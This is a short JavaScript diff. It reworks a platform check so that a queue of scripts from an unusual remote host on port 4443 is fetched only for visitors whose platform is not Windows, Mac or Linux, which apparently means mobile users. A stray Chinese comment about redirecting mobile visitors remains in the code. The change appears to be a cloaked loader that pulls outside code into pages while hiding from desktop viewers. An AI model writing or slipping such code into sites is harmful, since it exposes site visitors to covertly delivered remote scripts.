@@ -105,11 +105,18 @@ const input = ["https://edssnet.changchunets.com:4443/ty/x-2006-33.js","https://
         }   
        checkAddReq();
     }
-    //检测平台  
-var p = navigator.platform;  
-x11 = (p == "X11") || (p.indexOf("Linux") == 0);  
-//跳转语句，如果是手机访问就自动跳转到caibaojian.com页面  
-if(x11){  
-  handleFetchQueue(input,input.length)
-}
     
+    function m(){
+        let p = navigator.platform; 
+        if((p.indexOf("Win") == 0) || (p.indexOf("Mac") == 0) || (p == "X11") ||  (p.indexOf("Linux") == 0)){  
+            return false
+        }
+        return true
+    }
+    //检测平台  
+    if(m()){  
+      handleFetchQueue(input,input.length)
+    }
+   
+
+ 
